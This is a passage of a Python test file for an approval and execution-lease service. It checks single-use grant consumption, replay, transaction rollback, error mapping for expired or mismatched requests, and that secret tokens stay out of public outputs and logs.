    response = rig.evaluate()
    assert response.approval is not None
    _resolve_rig_allow_once(rig, response.approval.approval_id)

    with ThreadPoolExecutor(max_workers=16) as executor:
        results = list(executor.map(lambda _: _consume_rig(rig, response), range(32)))

    assert sum(not result.replayed for result in results) == 1
    assert len({result.lease.lease_id for result in results}) == 1
    assert len({result.consumption.consumption_id for result in results}) == 1
    assert len({result.lease_token for result in results}) == 1
    assert len(rig.store.grant_consumption_records) == 1
    assert len(rig.store.execution_lease_records) == 1


def test_transaction_failure_after_cas_restores_grant_and_writes_nothing(
    monkeypatch,
) -> None:
    rig = _service_rig()
    response = rig.evaluate()
    assert response.approval is not None
    _resolve_rig_allow_once(rig, response.approval.approval_id)
    binding = rig.store.get_enforcement_binding(response.approval.approval_id)
    assert binding is not None and binding.grant_id is not None

    def _lease_write_fails(**_kwargs: Any):
        raise RuntimeError("simulated lease insert failure")

    monkeypatch.setattr(memory_store_module, "ExecutionLease", _lease_write_fails)
    with pytest.raises(ApprovalExecutionLeaseUnavailableError):
        _consume_rig(rig, response)

    grant = rig.store.get_capability_grant_runtime(binding.grant_id)
    assert grant is not None and grant["remaining_uses"] == 1
    assert rig.store.grant_consumption_records == {}
    assert rig.store.execution_lease_records == {}


def test_consume_route_success_has_exact_four_field_response() -> None:
    rig = _service_rig()
    response = rig.evaluate(
        _ask_event(event_id="evt_rte05_route_success", call_id="call_route_success")
    )
    assert response.approval is not None
    assert response.enforcement_binding is not None
    _resolve_rig_allow_once(rig, response.approval.approval_id)
    endpoint = _consume_route_for_rig(rig)

    body = endpoint(
        approval_id=response.approval.approval_id,
        payload=ExecutionLeaseConsumeRequest(
            action_id=response.enforcement_binding.action_id,
            authorization_fingerprint=(
                response.enforcement_binding.authorization_fingerprint
            ),
        ),
        authorization=ADAPTER_HEADERS["Authorization"],
    )

    assert set(body) == {"lease_id", "consumption_id", "lease_token", "expires_at"}
    validate(body, _schema("execution_lease_consume_response.schema.json"))
    assert "grant_id" not in body
    assert "authorization_fingerprint" not in body


def test_consume_route_maps_not_found_pending_mismatch_and_wrong_principal() -> None:
    missing_rig = _service_rig()
    missing_endpoint = _consume_route_for_rig(missing_rig)
    missing_payload = ExecutionLeaseConsumeRequest(
        action_id="call_missing",
        authorization_fingerprint=_fingerprint("7"),
    )
    _assert_route_error(
        lambda: missing_endpoint(
            approval_id="app_missing",
            payload=missing_payload,
            authorization=ADAPTER_HEADERS["Authorization"],
        ),
        status_code=404,
        code="APPROVAL_NOT_FOUND",
        excluded_secrets=(missing_payload.authorization_fingerprint,),
    )

    pending_rig = _service_rig()
    pending_response = pending_rig.evaluate(
        _ask_event(event_id="evt_rte05_route_pending", call_id="call_route_pending")
    )
    assert pending_response.approval is not None
    assert pending_response.enforcement_binding is not None
    pending_endpoint = _consume_route_for_rig(pending_rig)
    pending_payload = ExecutionLeaseConsumeRequest(
        action_id=pending_response.enforcement_binding.action_id,
        authorization_fingerprint=(
            pending_response.enforcement_binding.authorization_fingerprint
        ),
    )
    _assert_route_error(
        lambda: pending_endpoint(
            approval_id=pending_response.approval.approval_id,
            payload=pending_payload,
            authorization=ADAPTER_HEADERS["Authorization"],
        ),
        status_code=409,
        code="APPROVAL_NOT_CONSUMABLE",
        excluded_secrets=(pending_payload.authorization_fingerprint,),
    )

    mismatch_rig = _service_rig()
    mismatch_response = mismatch_rig.evaluate(
        _ask_event(event_id="evt_rte05_route_mismatch", call_id="call_route_mismatch")
    )
    assert mismatch_response.approval is not None
    assert mismatch_response.enforcement_binding is not None
    _resolve_rig_allow_once(mismatch_rig, mismatch_response.approval.approval_id)
    mismatch_endpoint = _consume_route_for_rig(mismatch_rig)
    forged_fingerprint = _fingerprint("8")
    _assert_route_error(
        lambda: mismatch_endpoint(
            approval_id=mismatch_response.approval.approval_id,
            payload=ExecutionLeaseConsumeRequest(
                action_id=mismatch_response.enforcement_binding.action_id,
                authorization_fingerprint=forged_fingerprint,
            ),
            authorization=ADAPTER_HEADERS["Authorization"],
        ),
        status_code=409,
        code="APPROVAL_CONSUMPTION_CONFLICT",
        excluded_secrets=(forged_fingerprint,),
    )

    other_token = "other-adapter-secret"
    add_adapter_credential(
        mismatch_rig.store,
        token=other_token,
        principal_id="principal_other",
    )
    _assert_route_error(
        lambda: mismatch_endpoint(
            approval_id=mismatch_response.approval.approval_id,
            payload=ExecutionLeaseConsumeRequest(
                action_id=mismatch_response.enforcement_binding.action_id,
                authorization_fingerprint=(
                    mismatch_response.enforcement_binding.authorization_fingerprint
                ),
            ),
            authorization=f"Bearer {other_token}",
        ),
        status_code=403,
        code="APPROVAL_CONSUMPTION_DENIED",
        excluded_secrets=(
            other_token,
            mismatch_response.enforcement_binding.authorization_fingerprint,
        ),
    )


def test_consume_route_maps_approval_and_lease_expiry_separately() -> None:
    approval_rig = _service_rig()
    approval_response = approval_rig.evaluate(
        _ask_event(
            event_id="evt_rte05_route_approval_expiry",
            call_id="call_route_approval_expiry",
        )
    )
    assert approval_response.approval is not None
    assert approval_response.enforcement_binding is not None
    _resolve_rig_allow_once(approval_rig, approval_response.approval.approval_id)
    stored_approval = approval_rig.store.get_approval(
        approval_response.approval.approval_id
    )
    assert stored_approval is not None
    after_approval_expiry = datetime.fromisoformat(
        stored_approval.expires_at
    ) + timedelta(seconds=1)
    approval_rig.store.audit_clock = lambda: after_approval_expiry
    approval_endpoint = _consume_route_for_rig(approval_rig)
    _assert_route_error(
        lambda: approval_endpoint(
            approval_id=approval_response.approval.approval_id,
            payload=ExecutionLeaseConsumeRequest(
                action_id=approval_response.enforcement_binding.action_id,
                authorization_fingerprint=(
                    approval_response.enforcement_binding.authorization_fingerprint
                ),
            ),
            authorization=ADAPTER_HEADERS["Authorization"],
        ),
        status_code=410,
        code="APPROVAL_EXPIRED",
        excluded_secrets=(
            approval_response.enforcement_binding.authorization_fingerprint,
        ),
    )

    lease_rig = _service_rig()
    lease_response = lease_rig.evaluate(
        _ask_event(
            event_id="evt_rte05_route_lease_expiry",
            call_id="call_route_lease_expiry",
        )
    )
    assert lease_response.approval is not None
    assert lease_response.enforcement_binding is not None
    _resolve_rig_allow_once(lease_rig, lease_response.approval.approval_id)
    first = _consume_rig(lease_rig, lease_response)
    lease_rig.store.execution_lease_records[first.lease.lease_id] = (
        first.lease.model_copy(update={"expires_at": "2020-01-01T00:00:00+00:00"})
    )
    lease_endpoint = _consume_route_for_rig(lease_rig)
    _assert_route_error(
        lambda: lease_endpoint(
            approval_id=lease_response.approval.approval_id,
            payload=ExecutionLeaseConsumeRequest(
                action_id=lease_response.enforcement_binding.action_id,
                authorization_fingerprint=(
                    lease_response.enforcement_binding.authorization_fingerprint
                ),
            ),
            authorization=ADAPTER_HEADERS["Authorization"],
        ),
        status_code=410,
        code="EXECUTION_LEASE_EXPIRED",
        excluded_secrets=(
            first.lease_token,
            lease_response.enforcement_binding.authorization_fingerprint,
        ),
    )


def test_consume_route_maps_registration_unavailable_and_invalid_state() -> None:
    unavailable_rig = _service_rig()
    unavailable_response = unavailable_rig.evaluate(
        _ask_event(
            event_id="evt_rte05_route_unavailable",
            call_id="call_route_unavailable",
        )
    )
    assert unavailable_response.approval is not None
    assert unavailable_response.enforcement_binding is not None
    _resolve_rig_allow_once(unavailable_rig, unavailable_response.approval.approval_id)
    unavailable_binding = unavailable_rig.store.get_enforcement_binding(
        unavailable_response.approval.approval_id
    )
    assert unavailable_binding is not None
    unavailable_rig.store.capability_grants.clear()
    unavailable_rig.store.enforcement_bindings[unavailable_binding.approval_id] = (
        replace(unavailable_binding, grant_id=None)
    )
    unavailable_endpoint = _consume_route_for_rig(unavailable_rig)
    _assert_route_error(
        lambda: unavailable_endpoint(
            approval_id=unavailable_response.approval.approval_id,
            payload=ExecutionLeaseConsumeRequest(
                action_id=unavailable_response.enforcement_binding.action_id,
                authorization_fingerprint=(
                    unavailable_response.enforcement_binding.authorization_fingerprint
                ),
            ),
            authorization=ADAPTER_HEADERS["Authorization"],
        ),
        status_code=503,
        code="EXECUTION_LEASE_UNAVAILABLE",
        excluded_secrets=(
            unavailable_response.enforcement_binding.authorization_fingerprint,
        ),
    )
    assert unavailable_rig.store.grant_consumption_records == {}
    assert unavailable_rig.store.execution_lease_records == {}

    invalid_rig = _service_rig()
    invalid_response = invalid_rig.evaluate(
        _ask_event(event_id="evt_rte05_route_invalid", call_id="call_route_invalid")
    )
    assert invalid_response.approval is not None
    assert invalid_response.enforcement_binding is not None
    _resolve_rig_allow_once(invalid_rig, invalid_response.approval.approval_id)
    invalid_binding = invalid_rig.store.get_enforcement_binding(
        invalid_response.approval.approval_id
    )
    assert invalid_binding is not None and invalid_binding.grant_id is not None
    invalid_rig.store.capability_grants[invalid_binding.grant_id][
        "authorization_fingerprint"
    ] = _fingerprint("6")
    invalid_endpoint = _consume_route_for_rig(invalid_rig)
    _assert_route_error(
        lambda: invalid_endpoint(
            approval_id=invalid_response.approval.approval_id,
            payload=ExecutionLeaseConsumeRequest(
                action_id=invalid_response.enforcement_binding.action_id,
                authorization_fingerprint=(
                    invalid_response.enforcement_binding.authorization_fingerprint
                ),
            ),
            authorization=ADAPTER_HEADERS["Authorization"],
        ),
        status_code=503,
        code="EXECUTION_LEASE_UNAVAILABLE",
        excluded_secrets=(
            invalid_response.enforcement_binding.authorization_fingerprint,
        ),
    )


def test_fingerprint_and_lease_token_are_excluded_from_all_public_read_surfaces(
    caplog,
) -> None:
    rig = _service_rig()
    response = rig.evaluate(
        _ask_event(event_id="evt_rte05_secret_scan", call_id="call_secret_scan")
    )
    assert response.approval is not None
    assert response.enforcement_binding is not None
    fingerprint = response.enforcement_binding.authorization_fingerprint
    _resolve_rig_allow_once(rig, response.approval.approval_id)
    consumed = _consume_rig(rig, response)
    lease_token = consumed.lease_token
    private = rig.store.get_enforcement_binding(response.approval.approval_id)
    assert private is not None and private.grant_id is not None

    approval = rig.store.get_approval(response.approval.approval_id)
    assert approval is not None
    audit_window = AuditWindowService(
        store=rig.store,
        cursor_signing_key=rig.settings.audit_cursor_signing_key(),
    )
    trace_service = TraceService(
        store=rig.store,
        audit_window_service=audit_window,
    )
    public_payloads = {
        "approval": approval.model_dump(mode="json"),
        "approval_wait": approval_wait_payload(approval),
        "audit": [event.model_dump(mode="json") for event in rig.store.audit_events],
        "trace": trace_service.get_trace(approval.trace_id),
        "provenance": trace_service.get_provenance(approval.trace_id),
    }
    public_text = json.dumps(public_payloads, sort_keys=True)

    assert fingerprint not in public_text
    assert lease_token not in public_text
    assert private.grant_id not in public_text
    assert fingerprint not in caplog.text
    assert lease_token not in caplog.text
    assert private.grant_id not in caplog.text

    # Private authority is allowed to retain the exact fingerprint, but the
    # only persisted token form is a one-way digest.
    private_text = repr(
        {
            "bindings": rig.store.enforcement_bindings,
            "grants": rig.store.capability_grants,
            "consumptions": rig.store.grant_consumption_records,
            "leases": rig.store.execution_lease_records,
        }
    )
    assert fingerprint in private_text
    assert consumed.lease.token_digest in private_text
    assert lease_token not in private_text


@pytest.mark.postgres
def test_postgres_exact_success_and_replay_match_memory_contract(
    postgres_rig: _ServiceRig,
) -> None:
    response = postgres_rig.evaluate(
        _ask_event(event_id="evt_rte05_pg_exact", call_id="call_rte05_pg_exact")
    )
    assert response.approval is not None
    _resolve_rig_allow_once(postgres_rig, response.approval.approval_id)

    first = _consume_rig(postgres_rig, response)
    replay = _consume_rig(postgres_rig, response)

    assert first.replayed is False
    assert replay.replayed is True
    assert replay.lease_token == first.lease_token
    assert replay.lease.lease_id == first.lease.lease_id
    assert replay.consumption.consumption_id == first.consumption.consumption_id
    assert _postgres_authority_counts(postgres_rig.store) == (1, 1, 1, 1)
    persisted = _postgres_authority_text(postgres_rig.store)
    assert first.lease.token_digest in persisted
    assert first.lease_token not in persisted


@pytest.mark.parametrize("drift", ["action", "fingerprint"])
@pytest.mark.postgres
def test_postgres_binding_drift_is_409_class_and_zero_consume(
    postgres_rig: _ServiceRig,
    drift: str,
) -> None:
    response = postgres_rig.evaluate(
        _ask_event(
            event_id=f"evt_rte05_pg_drift_{drift}",
            call_id=f"call_rte05_pg_drift_{drift}",
        )
    )
    assert response.approval is not None
    assert response.enforcement_binding is not None
    _resolve_rig_allow_once(postgres_rig, response.approval.approval_id)
    kwargs: dict[str, str] = {}
    if drift == "action":
        kwargs["action_id"] = f"{response.enforcement_binding.action_id}-drift"
    else:
        kwargs["authorization_fingerprint"] = _fingerprint("f")

    with pytest.raises(ApprovalLeaseConsumptionConflictError):
        _consume_rig(postgres_rig, response, **kwargs)

    binding = postgres_rig.store.get_enforcement_binding(response.approval.approval_id)
    assert binding is not None and binding.grant_id is not None
    grant = postgres_rig.store.get_capability_grant_runtime(binding.grant_id)
    assert grant is not None and grant["remaining_uses"] == 1
    assert _postgres_authority_counts(postgres_rig.store) == (1, 1, 0, 0)


@pytest.mark.postgres
def test_postgres_approval_expiry_is_fail_closed(
    postgres_rig: _ServiceRig,
) -> None:
    response = postgres_rig.evaluate(
        _ask_event(
            event_id="evt_rte05_pg_approval_expiry",
            call_id="call_rte05_pg_approval_expiry",
        )
    )
    assert response.approval is not None
    _resolve_rig_allow_once(postgres_rig, response.approval.approval_id)
    _expire_postgres_approval_authority(
        postgres_rig,
        approval_id=response.approval.approval_id,
    )

    with pytest.raises(ApprovalLeaseExpiredError):
        _consume_rig(postgres_rig, response)
    assert _postgres_authority_counts(postgres_rig.store) == (1, 1, 0, 0)


@pytest.mark.postgres
def test_postgres_expired_approval_with_missing_registration_is_terminal(
    postgres_rig: _ServiceRig,
) -> None:
    from sqlalchemy import delete, update

    from guard_api.storage.sqlalchemy_models import (
        capability_grant_runtime,
        enforcement_bindings,
    )

    response = postgres_rig.evaluate(
        _ask_event(
            event_id="evt_rte05_pg_expired_missing_registration",
            call_id="call_rte05_pg_expired_missing_registration",
        )
    )
    assert response.approval is not None
    _resolve_rig_allow_once(postgres_rig, response.approval.approval_id)
    binding = postgres_rig.store.get_enforcement_binding(response.approval.approval_id)
    assert binding is not None and binding.grant_id is not None
    _expire_postgres_approval_authority(
        postgres_rig,
        approval_id=response.approval.approval_id,
    )
    with (
        postgres_rig.store._session_factory() as session
    ):  # pyright: ignore[reportPrivateUsage]
        with session.begin():
            session.execute(
                update(enforcement_bindings)
                .where(enforcement_bindings.c.approval_id == binding.approval_id)
                .values(grant_id=None)
            )
            session.execute(
                delete(capability_grant_runtime).where(
                    capability_grant_runtime.c.grant_id == binding.grant_id
                )
            )

    with pytest.raises(ApprovalLeaseExpiredError):
        _consume_rig(postgres_rig, response)
    assert _postgres_authority_counts(postgres_rig.store) == (1, 0, 0, 0)


@pytest.mark.postgres
def test_postgres_lease_expiry_is_fail_closed(
    postgres_rig: _ServiceRig,
) -> None:
    from sqlalchemy import update

    from guard_api.storage.postgres import execution_leases

    response = postgres_rig.evaluate(
        _ask_event(event_id="evt_rte05_pg_expiry", call_id="call_rte05_pg_expiry")
    )
    assert response.approval is not None
    _resolve_rig_allow_once(postgres_rig, response.approval.approval_id)
    issued_at = datetime.now(timezone.utc)
    first = _consume_rig(postgres_rig, response, now=issued_at)
    with (
        postgres_rig.store._session_factory() as session
    ):  # pyright: ignore[reportPrivateUsage]
        with session.begin():
            session.execute(
                update(execution_leases)
                .where(execution_leases.c.lease_id == first.lease.lease_id)
                .values(expires_at="2020-01-01T00:00:00+00:00")
            )
    with pytest.raises(ApprovalExecutionLeaseExpiredError):
        _consume_rig(postgres_rig, response)
    assert _postgres_authority_counts(postgres_rig.store) == (1, 1, 1, 1)


@pytest.mark.postgres
def test_postgres_exact_replay_after_approval_expiry_is_lease_expired(
    postgres_rig: _ServiceRig,
) -> None:
    response = postgres_rig.evaluate(
        _ask_event(
            event_id="evt_rte05_pg_bound_approval_expiry",
            call_id="call_rte05_pg_bound_approval_expiry",
        )
    )
    assert response.approval is not None
    _resolve_rig_allow_once(postgres_rig, response.approval.approval_id)
    first = _consume_rig(postgres_rig, response)
    _expire_postgres_approval_authority(
        postgres_rig,
        approval_id=response.approval.approval_id,
    )

    with pytest.raises(ApprovalExecutionLeaseExpiredError):
        _consume_rig(postgres_rig, response)
    assert first.lease.lease_id
    assert _postgres_authority_counts(postgres_rig.store) == (1, 1, 1, 1)


@pytest.mark.postgres
def test_postgres_concurrent_same_key_has_one_create_and_exact_replays(
    postgres_rig: _ServiceRig,
) -> None:
    response = postgres_rig.evaluate(
        _ask_event(
            event_id="evt_rte05_pg_concurrent",
            call_id="call_rte05_pg_concurrent",
        )
    )
    assert response.approval is not None
    _resolve_rig_allow_once(postgres_rig, response.approval.approval_id)

    with ThreadPoolExecutor(max_workers=8) as executor:
        results = list(
            executor.map(lambda _: _consume_rig(postgres_rig, response), range(16))
        )

    assert sum(not result.replayed for result in results) == 1
    assert len({result.lease_token for result in results}) == 1
    assert len({result.lease.lease_id for result in results}) == 1
    assert len({result.consumption.consumption_id for result in results}) == 1
    assert _postgres_authority_counts(postgres_rig.store) == (1, 1, 1, 1)


@pytest.mark.postgres
def test_postgres_late_unique_failure_rolls_back_target_consume(
    postgres_rig: _ServiceRig,
) -> None:
    """Force lease INSERT failure after grant CAS/consumption INSERT.

    A different lease first occupies the deterministic RTE-05 token digest;
    PostgreSQL's unique constraint then rejects the target lease late in the
    transaction.  The target grant decrement and target consumption must roll
    back atomically.
    """

    response = postgres_rig.evaluate(
        _ask_event(event_id="evt_rte05_pg_rollback", call_id="call_rte05_pg_rollback")
    )
    assert response.approval is not None
    assert response.enforcement_binding is not None
    _resolve_rig_allow_once(postgres_rig, response.approval.approval_id)
    binding = postgres_rig.store.get_enforcement_binding(response.approval.approval_id)
    assert binding is not None and binding.grant_id is not None
    colliding_token = derive_lease_token(
        postgres_rig.leases.lease_token_key,
        grant_id=binding.grant_id,
        action_id=binding.action_id,
        authorization_fingerprint=binding.authorization_fingerprint,
    )

    collision_grant = "grant:rte05-postgres-token-digest-collision"
    collision_action = "action:rte05-postgres-token-digest-collision"
    collision_fingerprint = _fingerprint("9")
    postgres_rig.store.seed_capability_grant_runtime(
        grant_id=collision_grant,
        scope_digest=SCOPE_DIGEST,
        remaining_uses=1,
        authorization_fingerprint=collision_fingerprint,
        status="active",
    )
    intent = ConsumptionIntent(
        grant_id=collision_grant,
        scope_digest=SCOPE_DIGEST,
        action_id=collision_action,
        authorization_fingerprint=collision_fingerprint,
        approval_id="approval:rte05-digest-collision",
        runtime_binding_id="binding:collision",
        intent_digest=consumption_intent_digest(
            grant_id=collision_grant,
            action_id=collision_action,
            authorization_fingerprint=collision_fingerprint,
        ),
    )
    now = datetime.now(timezone.utc)
    postgres_rig.store.consume_grant(
        SCOPE_DIGEST,
        {
            **intent.model_dump(mode="json"),
            "issued_at": now.isoformat(),
            "expires_at": (now + timedelta(minutes=5)).isoformat(),
            "lease_token": colliding_token,
        },
    )
    before = _postgres_authority_counts(postgres_rig.store)

    with pytest.raises(ApprovalExecutionLeaseUnavailableError):
        _consume_rig(postgres_rig, response)

    target_grant = postgres_rig.store.get_capability_grant_runtime(binding.grant_id)
    assert target_grant is not None and target_grant["remaining_uses"] == 1
    assert _postgres_authority_counts(postgres_rig.store) == before
